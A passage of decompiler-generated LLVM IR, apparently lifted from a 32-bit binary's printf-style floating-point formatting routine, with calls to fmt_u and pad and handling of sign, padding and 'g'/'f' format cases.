dec_label_pc_8052e72.loopexit:                    ; preds = %dec_label_pc_8052e6e.dec_label_pc_8052e72.loopexit_crit_edge, %dec_label_pc_8052e4f
  br label %dec_label_pc_8052e72

dec_label_pc_8052e72:                             ; preds = %dec_label_pc_8052e1e.dec_label_pc_8052e72_crit_edge, %dec_label_pc_8052e72.loopexit, %dec_label_pc_8052d04
  %v1_8052e7b = phi i32 [ %v2_8052e09, %dec_label_pc_8052e1e.dec_label_pc_8052e72_crit_edge ], [ %v0_8052e4f, %dec_label_pc_8052e72.loopexit ], [ %v1_8052d07, %dec_label_pc_8052d04 ]
  %v0_8052e72 = phi i32 [ %v0_8052e72.pre, %dec_label_pc_8052e1e.dec_label_pc_8052e72_crit_edge ], [ %v0_8052e47.lcssa, %dec_label_pc_8052e72.loopexit ], [ %v0_8052d04, %dec_label_pc_8052d04 ]
  %v1_8052e72 = add i32 %v0_8052e72, 4
  store i32 %v1_8052e72, i32* %eax.global-to-local, align 4
  %v1_8052e75 = add i32 %v1_8052e7b, 100
  %v2_8052e75 = inttoptr i32 %v1_8052e75 to i32*
  %v3_8052e75 = load i32, i32* %v2_8052e75, align 4
  %tmp557 = icmp ugt i32 %v3_8052e75, %v1_8052e72
  br i1 %tmp557, label %dec_label_pc_8052e7b, label %dec_label_pc_8052e86.preheader

dec_label_pc_8052e7b:                             ; preds = %dec_label_pc_8052e72
  store i32 %v1_8052e72, i32* %v2_8052e75, align 4
  %v0_8052e86430.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052e86.preheader

dec_label_pc_8052e86.preheader:                   ; preds = %dec_label_pc_8052e72, %dec_label_pc_8052e7b, %dec_label_pc_8052c80
  %v0_8052e86430 = phi i32 [ %v0_8052e86430.pre, %dec_label_pc_8052e7b ], [ %v0_8052ca9, %dec_label_pc_8052c80 ], [ %v1_8052e7b, %dec_label_pc_8052e72 ]
  %v1_8052e86431 = add i32 %v0_8052e86430, 96
  %v2_8052e86432 = inttoptr i32 %v1_8052e86431 to i32*
  %v3_8052e86433 = load i32, i32* %v2_8052e86432, align 4
  store i32 %v3_8052e86433, i32* %esi.global-to-local, align 4
  %v1_8052e8a434 = add i32 %v0_8052e86430, 100
  %v2_8052e8a435 = inttoptr i32 %v1_8052e8a434 to i32*
  %v3_8052e8a436 = load i32, i32* %v2_8052e8a435, align 4
  %tmp251437 = icmp ugt i32 %v3_8052e8a436, %v3_8052e86433
  br i1 %tmp251437, label %dec_label_pc_8052e90, label %dec_label_pc_8052e9a

dec_label_pc_8052e81:                             ; preds = %dec_label_pc_8052e90
  %v3_8052e81 = load i32, i32* %v2_8052e8a439, align 4
  %v4_8052e81 = add i32 %v3_8052e81, -4
  store i32 %v4_8052e81, i32* %v2_8052e8a439, align 4
  %v0_8052e86 = load i32, i32* @esp, align 4
  %v1_8052e86 = add i32 %v0_8052e86, 96
  %v2_8052e86 = inttoptr i32 %v1_8052e86 to i32*
  %v3_8052e86 = load i32, i32* %v2_8052e86, align 4
  store i32 %v3_8052e86, i32* %esi.global-to-local, align 4
  %v1_8052e8a = add i32 %v0_8052e86, 100
  %v2_8052e8a = inttoptr i32 %v1_8052e8a to i32*
  %v3_8052e8a = load i32, i32* %v2_8052e8a, align 4
  %tmp251 = icmp ugt i32 %v3_8052e8a, %v3_8052e86
  br i1 %tmp251, label %dec_label_pc_8052e90, label %dec_label_pc_8052e9a

dec_label_pc_8052e90:                             ; preds = %dec_label_pc_8052e86.preheader, %dec_label_pc_8052e81
  %v3_8052e8a440 = phi i32 [ %v3_8052e8a, %dec_label_pc_8052e81 ], [ %v3_8052e8a436, %dec_label_pc_8052e86.preheader ]
  %v2_8052e8a439 = phi i32* [ %v2_8052e8a, %dec_label_pc_8052e81 ], [ %v2_8052e8a435, %dec_label_pc_8052e86.preheader ]
  %v0_8052e86438 = phi i32 [ %v0_8052e86, %dec_label_pc_8052e81 ], [ %v0_8052e86430, %dec_label_pc_8052e86.preheader ]
  store i32 %v3_8052e8a440, i32* %eax.global-to-local, align 4
  %v1_8052e94 = add i32 %v3_8052e8a440, -4
  %v2_8052e94 = inttoptr i32 %v1_8052e94 to i32*
  %v3_8052e94 = load i32, i32* %v2_8052e94, align 4
  %v4_8052e94 = icmp eq i32 %v3_8052e94, 0
  br i1 %v4_8052e94, label %dec_label_pc_8052e81, label %dec_label_pc_8052e9a

dec_label_pc_8052e9a:                             ; preds = %dec_label_pc_8052e90, %dec_label_pc_8052e81, %dec_label_pc_8052e86.preheader
  %v0_8052e86.lcssa = phi i32 [ %v0_8052e86430, %dec_label_pc_8052e86.preheader ], [ %v0_8052e86, %dec_label_pc_8052e81 ], [ %v0_8052e86438, %dec_label_pc_8052e90 ]
  %v1_8052e9a = add i32 %v0_8052e86.lcssa, 92
  %v2_8052e9a = inttoptr i32 %v1_8052e9a to i32*
  %v3_8052e9a = load i32, i32* %v2_8052e9a, align 4
  %v12_8052e9a = icmp eq i32 %v3_8052e9a, 103
  %v1_8052e9f = icmp eq i1 %v12_8052e9a, false
  br i1 %v1_8052e9f, label %dec_label_pc_8052f56, label %dec_label_pc_8052ea5

dec_label_pc_8052ea5:                             ; preds = %dec_label_pc_8052e9a
  %v1_8052ea5 = add i32 %v0_8052e86.lcssa, 52
  %v2_8052ea5 = inttoptr i32 %v1_8052ea5 to i32*
  %v3_8052ea5 = load i32, i32* %v2_8052ea5, align 4
  %v4_8052ea5 = icmp eq i32 %v3_8052ea5, 0
  %v1_8052eaa = icmp eq i1 %v4_8052ea5, false
  br i1 %v1_8052eaa, label %dec_label_pc_8052eb4, label %dec_label_pc_8052eac

dec_label_pc_8052eac:                             ; preds = %dec_label_pc_8052ea5
  store i32 1, i32* %v2_8052ea5, align 4
  %v0_8052eb4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052eb4

dec_label_pc_8052eb4:                             ; preds = %dec_label_pc_8052ea5, %dec_label_pc_8052eac
  %v18_8052ecd = phi i32 [ %v0_8052e86.lcssa, %dec_label_pc_8052ea5 ], [ %v0_8052eb4.pre, %dec_label_pc_8052eac ]
  %v1_8052eb4 = add i32 %v18_8052ecd, 52
  %v2_8052eb4 = inttoptr i32 %v1_8052eb4 to i32*
  %v3_8052eb4 = load i32, i32* %v2_8052eb4, align 4
  %v4_8052eb4 = load i32, i32* @ebp, align 4
  %v5_8052eb4 = sub i32 %v3_8052eb4, %v4_8052eb4
  %v11_8052eb4 = xor i32 %v4_8052eb4, %v3_8052eb4
  %v12_8052eb4 = xor i32 %v5_8052eb4, %v3_8052eb4
  %v13_8052eb4 = and i32 %v12_8052eb4, %v11_8052eb4
  %v14_8052eb4 = icmp slt i32 %v13_8052eb4, 0
  %v15_8052eb4 = icmp eq i32 %v5_8052eb4, 0
  %v16_8052eb4 = icmp slt i32 %v5_8052eb4, 0
  %v3_8052eb8 = icmp ne i1 %v16_8052eb4, %v14_8052eb4
  %v4_8052eb8 = or i1 %v15_8052eb4, %v3_8052eb8
  br i1 %v4_8052eb8, label %dec_label_pc_8052ecd, label %dec_label_pc_8052eba

dec_label_pc_8052eba:                             ; preds = %dec_label_pc_8052eb4
  %v1_8052eba = add i32 %v4_8052eb4, 4
  %v6_8052eba = xor i32 %v4_8052eb4, -2147483648
  %v7_8052eba = xor i32 %v1_8052eba, %v4_8052eb4
  %v8_8052eba = and i32 %v7_8052eba, %v6_8052eba
  %v9_8052eba = icmp slt i32 %v8_8052eba, 0
  %v11_8052eba = icmp slt i32 %v1_8052eba, 0
  %v2_8052ebd = icmp eq i1 %v11_8052eba, %v9_8052eba
  br i1 %v2_8052ebd, label %dec_label_pc_8052ebf, label %dec_label_pc_8052ecd

dec_label_pc_8052ebf:                             ; preds = %dec_label_pc_8052eba
  %v1_8052ec1 = sub i32 -1, %v4_8052eb4
  store i32 %v1_8052ec1, i32* %eax.global-to-local, align 4
  %v1_8052ec3 = add i32 %v18_8052ecd, 68
  %v2_8052ec3 = inttoptr i32 %v1_8052ec3 to i32*
  %v3_8052ec3 = load i32, i32* %v2_8052ec3, align 4
  %v4_8052ec3 = add i32 %v3_8052ec3, -1
  store i32 %v4_8052ec3, i32* %v2_8052ec3, align 4
  %v0_8052ec7 = load i32, i32* @esp, align 4
  %v1_8052ec7 = add i32 %v0_8052ec7, 52
  %v2_8052ec7 = inttoptr i32 %v1_8052ec7 to i32*
  %v3_8052ec7 = load i32, i32* %v2_8052ec7, align 4
  %v4_8052ec7 = load i32, i32* %eax.global-to-local, align 4
  %v5_8052ec7 = add i32 %v4_8052ec7, %v3_8052ec7
  store i32 %v5_8052ec7, i32* %v2_8052ec7, align 4
  br label %dec_label_pc_8052ed6

dec_label_pc_8052ecd:                             ; preds = %dec_label_pc_8052eba, %dec_label_pc_8052eb4
  %v1_8052ecd = add i32 %v18_8052ecd, 68
  %v2_8052ecd = inttoptr i32 %v1_8052ecd to i32*
  %v3_8052ecd = load i32, i32* %v2_8052ecd, align 4
  %v4_8052ecd = add i32 %v3_8052ecd, -2
  store i32 %v4_8052ecd, i32* %v2_8052ecd, align 4
  %v0_8052ed2 = load i32, i32* @esp, align 4
  %v1_8052ed2 = add i32 %v0_8052ed2, 52
  %v2_8052ed2 = inttoptr i32 %v1_8052ed2 to i32*
  %v3_8052ed2 = load i32, i32* %v2_8052ed2, align 4
  %v4_8052ed2 = add i32 %v3_8052ed2, -1
  store i32 %v4_8052ed2, i32* %v2_8052ed2, align 4
  br label %dec_label_pc_8052ed6

dec_label_pc_8052ed6:                             ; preds = %dec_label_pc_8052ebf, %dec_label_pc_8052ecd
  %v0_8052ed6 = load i32, i32* @esp, align 4
  %v1_8052ed6 = add i32 %v0_8052ed6, 44
  %v2_8052ed6 = inttoptr i32 %v1_8052ed6 to i8*
  %v3_8052ed6 = load i8, i8* %v2_8052ed6, align 1
  %v4_8052ed6 = and i8 %v3_8052ed6, 8
  %v5_8052ed6 = icmp eq i8 %v4_8052ed6, 0
  %v1_8052edb = icmp eq i1 %v5_8052ed6, false
  br i1 %v1_8052edb, label %dec_label_pc_8052f56, label %dec_label_pc_8052edd

dec_label_pc_8052edd:                             ; preds = %dec_label_pc_8052ed6
  %v1_8052edd = add i32 %v0_8052ed6, 96
  %v2_8052edd = inttoptr i32 %v1_8052edd to i32*
  %v3_8052edd = load i32, i32* %v2_8052edd, align 4
  store i32 %v3_8052edd, i32* %edx.global-to-local, align 4
  %v1_8052ee1 = add i32 %v0_8052ed6, 100
  %v2_8052ee1 = inttoptr i32 %v1_8052ee1 to i32*
  %v3_8052ee1 = load i32, i32* %v2_8052ee1, align 4
  %tmp558 = icmp ugt i32 %v3_8052ee1, %v3_8052edd
  br i1 %tmp558, label %dec_label_pc_8052ee7, label %dec_label_pc_8052f0b

dec_label_pc_8052ee7:                             ; preds = %dec_label_pc_8052edd
  store i32 %v3_8052ee1, i32* @ebx, align 4
  %v1_8052eeb = add i32 %v3_8052ee1, -4
  %v2_8052eeb = inttoptr i32 %v1_8052eeb to i32*
  %v3_8052eeb = load i32, i32* %v2_8052eeb, align 4
  store i32 %v3_8052eeb, i32* %ecx.global-to-local, align 4
  %v2_8052eee = icmp eq i32 %v3_8052eeb, 0
  br i1 %v2_8052eee, label %dec_label_pc_8052f0b, label %dec_label_pc_8052ef2

dec_label_pc_8052ef2:                             ; preds = %dec_label_pc_8052ee7
  store i32 10, i32* @ebx, align 4
  %tmp252443 = urem i32 %v3_8052eeb, 10
  %v1_8052f05444 = icmp eq i32 %tmp252443, 0
  br i1 %v1_8052f05444, label %dec_label_pc_8052efb, label %dec_label_pc_8052f10.loopexit

dec_label_pc_8052efb:                             ; preds = %dec_label_pc_8052ef2, %dec_label_pc_8052efb
  %storemerge27446 = phi i32 [ %v1_8052efe, %dec_label_pc_8052efb ], [ 0, %dec_label_pc_8052ef2 ]
  %v1_8052efb445 = phi i32 [ %v3_8052efb, %dec_label_pc_8052efb ], [ 10, %dec_label_pc_8052ef2 ]
  %v3_8052efb = mul i32 %v1_8052efb445, 10
  %v1_8052efe = add i32 %storemerge27446, 1
  %tmp252 = urem i32 %v3_8052eeb, %v3_8052efb
  %v1_8052f05 = icmp eq i32 %tmp252, 0
  br i1 %v1_8052f05, label %dec_label_pc_8052efb, label %dec_label_pc_8052eff.dec_label_pc_8052f10.loopexit_crit_edge

dec_label_pc_8052f0b:                             ; preds = %dec_label_pc_8052edd, %dec_label_pc_8052ee7
  store i32 9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052f10

dec_label_pc_8052eff.dec_label_pc_8052f10.loopexit_crit_edge: ; preds = %dec_label_pc_8052efb
  store i32 %v3_8052efb, i32* @ebx, align 4
  br label %dec_label_pc_8052f10.loopexit

dec_label_pc_8052f10.loopexit:                    ; preds = %dec_label_pc_8052eff.dec_label_pc_8052f10.loopexit_crit_edge, %dec_label_pc_8052ef2
  %v1_8052efb.lcssa = phi i32 [ %v3_8052efb, %dec_label_pc_8052eff.dec_label_pc_8052f10.loopexit_crit_edge ], [ 10, %dec_label_pc_8052ef2 ]
  %storemerge27.lcssa = phi i32 [ %v1_8052efe, %dec_label_pc_8052eff.dec_label_pc_8052f10.loopexit_crit_edge ], [ 0, %dec_label_pc_8052ef2 ]
  %tmp252.lcssa = phi i32 [ %tmp252, %dec_label_pc_8052eff.dec_label_pc_8052f10.loopexit_crit_edge ], [ %tmp252443, %dec_label_pc_8052ef2 ]
  %div64 = udiv i32 %v3_8052eeb, %v1_8052efb.lcssa
  store i32 %storemerge27.lcssa, i32* %esi.global-to-local, align 4
  store i32 %tmp252.lcssa, i32* %edx.global-to-local, align 4
  store i32 %div64, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f10

dec_label_pc_8052f10:                             ; preds = %dec_label_pc_8052f10.loopexit, %dec_label_pc_8052f0b
  %v1_8052f41 = phi i32 [ %storemerge27.lcssa, %dec_label_pc_8052f10.loopexit ], [ 9, %dec_label_pc_8052f0b ]
  %v1_8052f10 = add i32 %v0_8052ed6, 68
  %v2_8052f10 = inttoptr i32 %v1_8052f10 to i32*
  %v3_8052f10 = load i32, i32* %v2_8052f10, align 4
  %v1_8052f14 = or i32 %v3_8052f10, 32
  store i32 %v1_8052f14, i32* %eax.global-to-local, align 4
  %v9_8052f17 = icmp eq i32 %v1_8052f14, 102
  %v1_8052f1a = icmp eq i1 %v9_8052f17, false
  %v3_8052f2f = load i32, i32* %v2_8052ee1, align 4
  store i32 %v3_8052f2f, i32* %eax.global-to-local, align 4
  %v2_8052f33 = add i32 %v0_8052ed6, 104
  %v3_8052f33 = inttoptr i32 %v2_8052f33 to i32*
  %v4_8052f33 = load i32, i32* %v3_8052f33, align 4
  %v5_8052f33 = sub i32 %v3_8052f2f, %v4_8052f33
  %v2_8052f37 = sdiv i32 %v5_8052f33, 4
  %v3_8052f3a = mul i32 %v2_8052f37, 9
  store i32 %v3_8052f3a, i32* %eax.global-to-local, align 4
  br i1 %v1_8052f1a, label %dec_label_pc_8052f2f, label %dec_label_pc_8052f1c

dec_label_pc_8052f1c:                             ; preds = %dec_label_pc_8052f10
  %v1_8052f2a = add i32 %v3_8052f3a, -9
  br label %dec_label_pc_8052f41

dec_label_pc_8052f2f:                             ; preds = %dec_label_pc_8052f10
  %v0_8052f3d = load i32, i32* @ebp, align 4
  %v2_8052f3d = add i32 %v3_8052f3a, -9
  %v3_8052f3d = add i32 %v2_8052f3d, %v0_8052f3d
  br label %dec_label_pc_8052f41

dec_label_pc_8052f41:                             ; preds = %dec_label_pc_8052f1c, %dec_label_pc_8052f2f
  %storemerge28 = phi i32 [ %v1_8052f2a, %dec_label_pc_8052f1c ], [ %v3_8052f3d, %dec_label_pc_8052f2f ]
  %v2_8052f41 = sub i32 %storemerge28, %v1_8052f41
  %v1_8052f45 = xor i32 %v2_8052f41, -2147483648
  %v2_8052f47 = ashr i32 %v1_8052f45, 31
  store i32 %v2_8052f47, i32* %eax.global-to-local, align 4
  %v2_8052f4a = and i32 %v2_8052f47, %v2_8052f41
  store i32 %v2_8052f4a, i32* %edx.global-to-local, align 4
  %v1_8052f4c = add i32 %v0_8052ed6, 52
  %v2_8052f4c = inttoptr i32 %v1_8052f4c to i32*
  %v3_8052f4c = load i32, i32* %v2_8052f4c, align 4
  %v5_8052f4c = sub i32 %v3_8052f4c, %v2_8052f4a
  %v11_8052f4c = xor i32 %v2_8052f4a, %v3_8052f4c
  %v12_8052f4c = xor i32 %v5_8052f4c, %v3_8052f4c
  %v13_8052f4c = and i32 %v12_8052f4c, %v11_8052f4c
  %v14_8052f4c = icmp slt i32 %v13_8052f4c, 0
  %v15_8052f4c = icmp eq i32 %v5_8052f4c, 0
  %v16_8052f4c = icmp slt i32 %v5_8052f4c, 0
  %v3_8052f50 = icmp ne i1 %v16_8052f4c, %v14_8052f4c
  %v4_8052f50 = or i1 %v15_8052f4c, %v3_8052f50
  br i1 %v4_8052f50, label %dec_label_pc_8052f56, label %dec_label_pc_8052f52

dec_label_pc_8052f52:                             ; preds = %dec_label_pc_8052f41
  store i32 %v2_8052f4a, i32* %v2_8052f4c, align 4
  %v0_8052f56.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052f56

dec_label_pc_8052f56:                             ; preds = %dec_label_pc_8052f41, %dec_label_pc_8052ed6, %dec_label_pc_8052e9a, %dec_label_pc_8052f52
  %v1_8052f7e = phi i32 [ %v0_8052ed6, %dec_label_pc_8052f41 ], [ %v0_8052ed6, %dec_label_pc_8052ed6 ], [ %v0_8052e86.lcssa, %dec_label_pc_8052e9a ], [ %v0_8052f56.pre, %dec_label_pc_8052f52 ]
  %v1_8052f56 = add i32 %v1_8052f7e, 52
  %v2_8052f56 = inttoptr i32 %v1_8052f56 to i32*
  %v3_8052f56 = load i32, i32* %v2_8052f56, align 4
  %v4_8052f56 = icmp eq i32 %v3_8052f56, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_8052f60 = icmp eq i1 %v4_8052f56, false
  br i1 %v1_8052f60, label %dec_label_pc_8052f6c, label %dec_label_pc_8052f62

dec_label_pc_8052f62:                             ; preds = %dec_label_pc_8052f56
  %v1_8052f62 = add i32 %v1_8052f7e, 44
  %v2_8052f62 = inttoptr i32 %v1_8052f62 to i32*
  %v3_8052f62 = load i32, i32* %v2_8052f62, align 4
  %v2_8052f66 = udiv i32 %v3_8052f62, 8
  %v1_8052f69 = urem i32 %v2_8052f66, 2
  store i32 %v1_8052f69, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f6c

dec_label_pc_8052f6c:                             ; preds = %dec_label_pc_8052f56, %dec_label_pc_8052f62
  %v0_8052f70 = phi i32 [ 1, %dec_label_pc_8052f56 ], [ %v1_8052f69, %dec_label_pc_8052f62 ]
  %v3_8052f6c = load i32, i32* %v2_8052f56, align 4
  store i32 %v3_8052f6c, i32* @esi, align 4
  %v2_8052f70 = add nuw nsw i32 %v0_8052f70, 1
  %v3_8052f70 = add i32 %v2_8052f70, %v3_8052f6c
  store i32 %v3_8052f70, i32* @edi, align 4
  %v1_8052f74 = add i32 %v1_8052f7e, 68
  %v2_8052f74 = inttoptr i32 %v1_8052f74 to i32*
  %v3_8052f74 = load i32, i32* %v2_8052f74, align 4
  %v1_8052f78 = or i32 %v3_8052f74, 32
  store i32 %v1_8052f78, i32* %eax.global-to-local, align 4
  %v9_8052f7b = icmp eq i32 %v1_8052f78, 102
  %v2_8052f7e = add i32 %v1_8052f7e, 112
  %v3_8052f7e = inttoptr i32 %v2_8052f7e to i32*
  store i32 %v1_8052f78, i32* %v3_8052f7e, align 4
  %v1_8052f82 = icmp eq i1 %v9_8052f7b, false
  %v0_8052f8c = load i32, i32* @ebp, align 4
  br i1 %v1_8052f82, label %dec_label_pc_8052f8c, label %dec_label_pc_8052f84

dec_label_pc_8052f84:                             ; preds = %dec_label_pc_8052f6c
  %tmp253 = icmp slt i32 %v0_8052f8c, 1
  %v0_8052fe9.pre = load i32, i32* @edi, align 4
  br i1 %tmp253, label %dec_label_pc_8052fe9, label %dec_label_pc_8052f88

dec_label_pc_8052f88:                             ; preds = %dec_label_pc_8052f84
  %v2_8052f88 = add i32 %v0_8052fe9.pre, %v0_8052f8c
  store i32 %v2_8052f88, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052fe9

dec_label_pc_8052f8c:                             ; preds = %dec_label_pc_8052f6c
  %v2_8052f8e = ashr i32 %v0_8052f8c, 31
  %v2_8052f93 = xor i32 %v2_8052f8e, %v0_8052f8c
  %v2_8052f95 = sub i32 %v2_8052f93, %v2_8052f8e
  store i32 %v2_8052f95, i32* @eax, align 4
  %v0_8052f97 = load i32, i32* @esp, align 4
  %v1_8052f97 = add i32 %v0_8052f97, 7792
  store i32 %v1_8052f97, i32* @esi, align 4
  %v1_8052f9e = ashr i32 %v2_8052f95, 31
  store i32 %v1_8052f9e, i32* @edx, align 4
  store i32 %v1_8052f97, i32* @ecx, align 4
  %v0_8052fa1 = call i32 @fmt_u()
  %v0_8052fa6 = load i32, i32* @esp, align 4
  %v1_8052fa6 = add i32 %v0_8052fa6, 7780
  %v2_8052fad = sub i32 %v1_8052fa6, %v0_8052fa1
  store i32 %v0_8052fa1, i32* %edx.global-to-local, align 4
  %v1_8052fb1 = add i32 %v2_8052fad, 12
  store i32 %v1_8052fb1, i32* %eax.global-to-local, align 4
  %v0_8052fb4 = load i32, i32* @esi, align 4
  store i32 %v0_8052fb4, i32* @ebx, align 4
  %v1_8052fbe450 = add i32 %v2_8052fad, 11
  %v6_8052fbe452 = sub i32 -12, %v2_8052fad
  %v7_8052fbe453 = and i32 %v1_8052fb1, %v6_8052fbe452
  %v8_8052fbe454 = icmp slt i32 %v7_8052fbe453, 0
  %v9_8052fbe455 = icmp eq i32 %v1_8052fbe450, 0
  %v10_8052fbe456 = icmp slt i32 %v1_8052fbe450, 0
  %v1_8052fc1457 = add i32 %v0_8052fa1, -1
  store i32 %v1_8052fc1457, i32* %ecx.global-to-local, align 4
  %v3_8052fc4458 = icmp ne i1 %v10_8052fbe456, %v8_8052fbe454
  %v4_8052fc4459 = or i1 %v9_8052fbe455, %v3_8052fc4458
  br i1 %v4_8052fc4459, label %dec_label_pc_8052fb8, label %dec_label_pc_8052fc6

dec_label_pc_8052fb8:                             ; preds = %dec_label_pc_8052f8c, %dec_label_pc_8052fb8
  %v1_8052fc1461 = phi i32 [ %v1_8052fc1, %dec_label_pc_8052fb8 ], [ %v1_8052fc1457, %dec_label_pc_8052f8c ]
  %v0_8052fba460 = phi i32 [ %v0_8052fbe.pre, %dec_label_pc_8052fb8 ], [ %v1_8052fb1, %dec_label_pc_8052f8c ]
  store i32 %v1_8052fc1461, i32* %edx.global-to-local, align 4
  %v1_8052fba = add i32 %v0_8052fba460, 1
  store i32 %v1_8052fba, i32* %eax.global-to-local, align 4
  %v1_8052fbb = inttoptr i32 %v1_8052fc1461 to i8*
  store i8 48, i8* %v1_8052fbb, align 1
  %v0_8052fbe.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_8052fc1.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8052fbe = add i32 %v0_8052fbe.pre, -1
  %v6_8052fbe = sub i32 0, %v0_8052fbe.pre
  %v7_8052fbe = and i32 %v0_8052fbe.pre, %v6_8052fbe
  %v8_8052fbe = icmp slt i32 %v7_8052fbe, 0
  %v9_8052fbe = icmp eq i32 %v1_8052fbe, 0
  %v10_8052fbe = icmp slt i32 %v1_8052fbe, 0
  %v1_8052fc1 = add i32 %v0_8052fc1.pre, -1
  store i32 %v1_8052fc1, i32* %ecx.global-to-local, align 4
  %v3_8052fc4 = icmp ne i1 %v10_8052fbe, %v8_8052fbe
  %v4_8052fc4 = or i1 %v9_8052fbe, %v3_8052fc4
  br i1 %v4_8052fc4, label %dec_label_pc_8052fb8, label %dec_label_pc_8052fc6

dec_label_pc_8052fc6:                             ; preds = %dec_label_pc_8052fb8, %dec_label_pc_8052f8c
  %v1_8052fc1.lcssa = phi i32 [ %v1_8052fc1457, %dec_label_pc_8052f8c ], [ %v1_8052fc1, %dec_label_pc_8052fb8 ]
  %v0_8052fc6 = load i32, i32* @ebp, align 4
  %v2_8052fc8 = ashr i32 %v0_8052fc6, 31
  %v1_8052fcb = and i32 %v2_8052fc8, 2
  %v1_8052fce = add nuw nsw i32 %v1_8052fcb, 43
  %v11_8052fce = trunc i32 %v1_8052fce to i8
  store i32 %v1_8052fce, i32* %eax.global-to-local, align 4
  %v4_8052fd1 = inttoptr i32 %v1_8052fc1.lcssa to i8*
  store i8 %v11_8052fce, i8* %v4_8052fd1, align 1
  %v0_8052fd4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052fd4 = add i32 %v0_8052fd4, -2
  store i32 %v1_8052fd4, i32* %edx.global-to-local, align 4
  %v1_8052fd7 = load i32, i32* @esp, align 4
  %v2_8052fd7 = add i32 %v1_8052fd7, 76
  %v3_8052fd7 = inttoptr i32 %v2_8052fd7 to i32*
  store i32 %v1_8052fd4, i32* %v3_8052fd7, align 4
  %v0_8052fdb = load i32, i32* @esp, align 4
  %v1_8052fdb = add i32 %v0_8052fdb, 68
  %v2_8052fdb = inttoptr i32 %v1_8052fdb to i8*
  %v3_8052fdb = load i8, i8* %v2_8052fdb, align 1
  %v4_8052fdb = zext i8 %v3_8052fdb to i32
  %v5_8052fdb = load i32, i32* %edx.global-to-local, align 4
  %v6_8052fdb = and i32 %v5_8052fdb, -256
  %v7_8052fdb = or i32 %v6_8052fdb, %v4_8052fdb
  store i32 %v7_8052fdb, i32* %edx.global-to-local, align 4
  %v0_8052fdf = load i32, i32* @ebx, align 4
  %v1_8052fdf = load i32, i32* @edi, align 4
  %v2_8052fdf = add i32 %v1_8052fdf, %v0_8052fdf
  store i32 %v2_8052fdf, i32* %edi.global-to-local, align 4
  %v2_8052fe2 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8052fe2 = add i32 %v2_8052fe2, -1
  %v4_8052fe2 = inttoptr i32 %v3_8052fe2 to i8*
  store i8 %v3_8052fdb, i8* %v4_8052fe2, align 1
  %v0_8052fe5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052fe5 = load i32, i32* @esp, align 4
  %v2_8052fe5 = add i32 %v1_8052fe5, 76
  %v3_8052fe5 = inttoptr i32 %v2_8052fe5 to i32*
  %v4_8052fe5 = load i32, i32* %v3_8052fe5, align 4
  %v5_8052fe5 = sub i32 %v0_8052fe5, %v4_8052fe5
  store i32 %v5_8052fe5, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052fe9

dec_label_pc_8052fe9:                             ; preds = %dec_label_pc_8052f84, %dec_label_pc_8052f88, %dec_label_pc_8052fc6
  %v0_8052fe9 = phi i32 [ %v2_8052f88, %dec_label_pc_8052f88 ], [ %v5_8052fe5, %dec_label_pc_8052fc6 ], [ %v0_8052fe9.pre, %dec_label_pc_8052f84 ]
  %v1_8052fe9 = load i32, i32* @esp, align 4
  %v2_8052fe9 = add i32 %v1_8052fe9, 80
  %v3_8052fe9 = inttoptr i32 %v2_8052fe9 to i32*
  %v4_8052fe9 = load i32, i32* %v3_8052fe9, align 4
  %v5_8052fe9 = add i32 %v4_8052fe9, %v0_8052fe9
  store i32 %v5_8052fe9, i32* @edi, align 4
  store i32 32, i32* @edx, align 4
  %v2_8052ff2 = add i32 %v1_8052fe9, 108
  %v3_8052ff2 = inttoptr i32 %v2_8052ff2 to i32*
  store i32 %v5_8052fe9, i32* %v3_8052ff2, align 4
  %v0_8052ff6 = load i32, i32* @ebp, align 4
  %v1_8052ff6 = load i32, i32* @esp, align 4
  %v2_8052ff6 = add i32 %v1_8052ff6, -4
  %v3_8052ff6 = inttoptr i32 %v2_8052ff6 to i32*
  store i32 %v0_8052ff6, i32* %v3_8052ff6, align 4
  %v0_8052ff7 = load i32, i32* @ebp, align 4
  %v2_8052ff7 = add i32 %v1_8052ff6, -8
  %v3_8052ff7 = inttoptr i32 %v2_8052ff7 to i32*
  store i32 %v0_8052ff7, i32* %v3_8052ff7, align 4
  %v1_8052ff8 = add i32 %v1_8052ff6, 44
  %v2_8052ff8 = inttoptr i32 %v1_8052ff8 to i32*
  %v3_8052ff8 = load i32, i32* %v2_8052ff8, align 4
  %v5_8052ff8 = add i32 %v1_8052ff6, -12
  %v6_8052ff8 = inttoptr i32 %v5_8052ff8 to i32*
  store i32 %v3_8052ff8, i32* %v6_8052ff8, align 4
  %v1_8052ffc = add i32 %v1_8052ff6, 108
  %v2_8052ffc = inttoptr i32 %v1_8052ffc to i32*
  %v3_8052ffc = load i32, i32* %v2_8052ffc, align 4
  %v5_8052ffc = add i32 %v1_8052ff6, -16
  %v6_8052ffc = inttoptr i32 %v5_8052ffc to i32*
  store i32 %v3_8052ffc, i32* %v6_8052ffc, align 4
  %v1_8053000 = add i32 %v1_8052ff6, 48
  %v2_8053000 = inttoptr i32 %v1_8053000 to i32*
  %v3_8053000 = load i32, i32* %v2_8053000, align 4
  store i32 %v3_8053000, i32* @ecx, align 4
  %v1_8053004 = add i32 %v1_8052ff6, 36
  %v2_8053004 = inttoptr i32 %v1_8053004 to i32*
  %v3_8053004 = load i32, i32* %v2_8053004, align 4
  store i32 %v3_8053004, i32* @eax, align 4
  %v0_8053008 = call i32 @pad()
  store i32 %v0_8053008, i32* %eax.global-to-local, align 4
  %v0_805300d = load i32, i32* @esp, align 4
  %v1_805300d = add i32 %v0_805300d, 96
  %v2_805300d = inttoptr i32 %v1_805300d to i32*
  %v3_805300d = load i32, i32* %v2_805300d, align 4
  store i32 %v3_805300d, i32* @ecx, align 4
  %v1_8053011 = add i32 %v0_805300d, 100
  %v2_8053011 = inttoptr i32 %v1_8053011 to i32*
  %v3_8053011 = load i32, i32* %v2_8053011, align 4
  store i32 %v3_8053011, i32* @edx, align 4
